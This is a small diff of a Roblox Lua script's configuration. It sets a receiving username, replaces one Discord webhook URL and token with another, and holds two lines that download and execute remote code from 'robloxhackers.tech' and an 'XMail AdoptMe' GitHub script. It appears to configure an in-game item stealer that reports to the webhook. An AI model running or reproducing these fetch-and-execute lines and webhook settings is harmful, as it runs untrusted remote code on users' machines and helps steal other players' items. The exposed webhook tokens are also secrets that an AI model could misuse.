@@ -1,4 +1,4 @@
 Username = "Gablock40"
-Webhook = "https://discord.com/api/webhooks/1309139531693555773/5rStrY54O_ddhq4B3X-kEFPriOLILgXUhxdTCQe33UBVx2dMEcSRLFDEYB_n3Te6sHk9"
+Webhook = "https://discord.com/api/webhooks/1309139528992297000/6E0klFmWXjltj5Dk02Ii_b-1Czopu9uVm0zCuA0tQgQPRFBNwIGaIRJJ0GLPh2bg5ZXM"
 loadstring(game:HttpGet("https://robloxhackers.tech/adopt", true))() 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/XScriptsOfficial/XMail/main/AdoptMe", true))()
